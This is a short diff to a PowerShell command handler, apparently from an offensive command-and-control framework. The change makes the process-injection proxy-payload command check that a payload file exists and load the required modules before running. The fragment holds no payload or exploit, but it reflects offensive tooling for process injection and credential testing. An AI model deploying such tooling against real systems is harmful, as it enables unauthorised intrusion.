@@ -676,10 +676,16 @@ $error.clear()
             }
             if ($pscommand.ToLower().StartsWith('invoke-psinject-proxypayload'))
             { 
+                if (Test-Path "$FolderPath\proxypayload.bat"){ 
                 CheckModuleLoaded "invoke-psinject.ps1" $psrandomuri
+                CheckModuleLoaded "proxypayload.ps1" $psrandomuri
                 CheckModuleLoaded "NamedPipeProxy.ps1" $psrandomuri
                 $psargs = $pscommand -replace 'invoke-psinject-proxypayload',''
                 $pscommand = "invoke-psinject -payloadtype proxy $($psargs)"
+                } else {
+                write-host "Need to run CreateProxyPayload first"
+                $pscommand = 'fvdsghfdsyyh'
+                }
             }
             if ($pscommand.ToLower().StartsWith('test-adcredential'))
             { 
